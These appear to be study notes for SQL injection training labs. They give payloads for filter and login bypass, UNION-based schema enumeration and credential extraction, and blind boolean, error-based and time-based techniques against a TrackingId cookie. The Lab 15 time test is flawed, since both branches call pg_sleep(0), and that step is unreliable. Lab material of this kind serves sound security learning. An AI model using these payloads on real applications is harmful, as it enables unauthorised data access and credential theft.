# SQL Injection Guide

## Introduction
SQL Injection (SQLi) is a web security vulnerability that allows attackers to interfere with database queries made by an application. This can allow attackers to:
- View data they normally couldn't access
- Modify or delete data in the database
- In some cases, compromise the underlying server or backend infrastructure
- Execute denial of service attacks

## Lab Exercises

### Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Exploitation:**
- Modify the category parameter: `'+OR+1=1--`
- This transforms the query to: 
```sql
SELECT * FROM products WHERE category='' OR 1=1--' AND released=1
```
- The `--` comments out the rest of the query, and `OR 1=1` ensures all products are returned

### Lab 2: SQL injection vulnerability allowing login bypass
**Exploitation:**
```sql
SELECT firstname FROM users where username='administrator'--' and password='administrator'--'
```
- The `--` comments out the password check entirely

### Lab 3: SQL injection attack, querying the database type and version on Oracle
**Exploitation:**
```sql
' UNION SELECT 'abc','def' FROM dual--
' UNION SELECT BANNER, NULL FROM v$version--
```
- Oracle requires selection FROM a table, even for literals (using `dual`)

### Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft
**Exploitation:**
```sql
'+UNION+SELECT+'abc','def'#
'+UNION+SELECT+@@version,+NULL#
```
- First check column count with `ORDER BY 1`
- Use binary search approach to find the exact number of columns
- Replace NULL values with variable names like `@@version`

### Lab 5: SQL injection attack, listing the database contents on non-Oracle databases
**Exploitation:**
```sql
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
```
- Access schema information from `information_schema.tables` and `information_schema.columns`

### Lab 6: SQL injection attack, listing the database contents on Oracle
**Exploitation:**
```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_RGVKUG'--
'+UNION+SELECT+USERNAME_ALTYZU,PASSWORD_LNYTLU+FROM+USERS_RGVKUG--
```
- Oracle uses `all_tables` and `all_tab_columns` instead of `information_schema`

### Lab 7: SQL injection UNION attack, determining the number of columns returned by the query
**Exploitation:**
```sql
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+ORDER+BY+3--
'+UNION+SELECT+NULL,NULL,NULL--
```
- Use `ORDER BY n` to determine column count
- Then verify with `UNION SELECT NULL` statements

### Lab 8: SQL injection UNION attack, finding a column containing text
**Exploitation:**
```sql
'+UNION+SELECT+NULL,NULL,NULL--
'+UNION+SELECT+'abcdef',NULL,NULL--
```
- Replace NULL with text string to find which column accepts text data

### Lab 9: SQL injection UNION attack, retrieving data from other tables
**Exploitation:**
```sql
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+username,+password+FROM+users--
```
- First identify table structure, then extract credentials

### Lab 10: SQL injection UNION attack, retrieving multiple values in a single column
**Exploitation:**
```sql
'+UNION+SELECT+NULL,'abc'--
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
- Use string concatenation to combine multiple columns into one

### Lab 11: Blind SQL injection with conditional responses
**Process:**
1. Verify vulnerability: `TrackingId=M0omrXqu566xdYiZ' AND 1=1--` (returns "welcome back")
2. Check table existence: `TrackingId=M0omrXqu566xdYiZ' AND (SELECT 'a' FROM users LIMIT 1)='a'--`
3. Check user existence: `TrackingId=M0omrXqu566xdYiZ' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--`
4. Find password length: `TrackingId=M0omrXqu566xdYiZ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--`
5. Extract password characters: `TrackingId=M0omrXqu566xdYiZ' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--`

### Lab 12: Blind SQL injection with conditional errors
**Process:**
1. Confirm SQL syntax error: `TrackingId=xyz'` (produces error), `TrackingId=xyz''` (no error)
2. Test table existence: `TrackingId=xyz' || (SELECT '' FROM users WHERE ROWNUM=1) || '`
3. Use CASE statements with division by zero to trigger errors:
   ```sql
   TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)|| '
   ```
4. Determine password length and extract characters through Burp Intruder

### Lab 13: Visible error-based SQL injection
**Exploitation:**
```sql
TrackingId=xyz' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
TrackingId=' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```
- Forces type conversion errors that leak data in error messages

### Lab 14: Blind SQL injection with time delays
**Exploitation:**
```sql
TrackingId=x' || pg_sleep(10)--
```
- Uses database-specific time delay functions for detection

### Lab 15: Blind SQL injection with time delays and information retrieval
**Process:**
1. Test vulnerability: `TrackingId=x' %3BSELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(0) END--`
2. Check user existence: `TrackingId=x' %3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(0) ELSE pg_sleep(0) END FROM users--`
3. Determine password length and extract characters through time-based tests

### Lab 16: Blind SQL injection with out-of-band interaction
*No specific solution provided in notes*

### Lab 17: Blind SQL injection with out-of-band data exfiltration
*No specific solution provided in notes*

### Lab 18: SQL injection with filter bypass via XML encoding
*No specific solution provided in notes*

## Key Techniques
- UNION attacks for data retrieval
- Conditional responses for blind SQL injection
- Error-based extraction of data
- Time-based extraction techniques
- String concatenation for combining values
- Comments to remove unwanted query parts (`--`, `#`)
- Database-specific functions and schema inspection

## Database-Specific Notes
- Oracle: requires `FROM dual`, uses `all_tables` and `all_tab_columns`
- MySQL: uses `#` for comments, `@@version` variable
- PostgreSQL: uses `pg_sleep()` for time delays